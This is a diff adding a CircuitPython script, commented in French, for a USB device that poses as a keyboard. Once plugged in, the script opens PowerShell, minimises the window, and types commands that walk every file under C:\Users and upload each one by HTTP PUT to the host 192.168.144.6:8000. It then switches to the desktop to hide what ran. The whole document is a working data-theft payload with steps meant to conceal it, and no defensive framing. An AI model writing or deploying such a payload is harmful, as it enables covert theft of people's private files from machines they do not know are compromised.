@@ -1,0 +1,54 @@
+import time
+import board
+import usb_hid
+from adafruit_hid.keyboard import Keyboard
+from adafruit_hid.keyboard_layout_win_fr import KeyboardLayout  # Layout FR
+from adafruit_hid.keycode_win_fr import Keycode  # Keycodes FR
+
+# Initialiser le clavier et le layout
+keyboard = Keyboard(usb_hid.devices)
+layout = KeyboardLayout(keyboard)
+
+# Attendre que tout soit prêt
+time.sleep(2)
+
+# Ouvre la boîte Exécuter avec Win + R
+keyboard.press(Keycode.GUI, Keycode.R)
+keyboard.release_all()
+time.sleep(0.5)
+
+# Lance PowerShell depuis cmd (plus fiable)
+layout.write("powershell")
+keyboard.press(Keycode.ENTER)
+keyboard.release_all()
+time.sleep(2)
+
+# Minimiser aussi la fenêtre PowerShell après l'ouverture
+keyboard.press(Keycode.ALT)
+keyboard.press(Keycode.SPACE)
+keyboard.release_all()
+time.sleep(0.2)
+
+keyboard.press(Keycode.N)
+keyboard.release_all()
+
+# Liste des lignes PowerShell à exécuter
+lines = [
+    '$files = Get-ChildItem -Path "C:\\Users" -Recurse -File -ErrorAction SilentlyContinue',
+    'foreach ($file in $files) {',
+    '  $name = $file.FullName.Replace(":", "").Replace("\\", "/")',  # Remplacer les \ par des / et nettoyer les :
+    '  Invoke-WebRequest -Uri "http://192.168.144.6:8000/$name" -Method PUT -InFile $file.FullName',  # Utilisation correcte de PUT
+    '}'
+]
+
+# Tape chaque ligne dans PowerShell
+for line in lines:
+    layout.write(line)
+    keyboard.press(Keycode.ENTER)
+    keyboard.release_all()
+    time.sleep(0.3)  # délai entre les lignes
+
+# Réduire toutes les fenêtres (Win + D) pour revenir au bureau
+keyboard.press(Keycode.GUI, Keycode.D)
+keyboard.release_all()
+
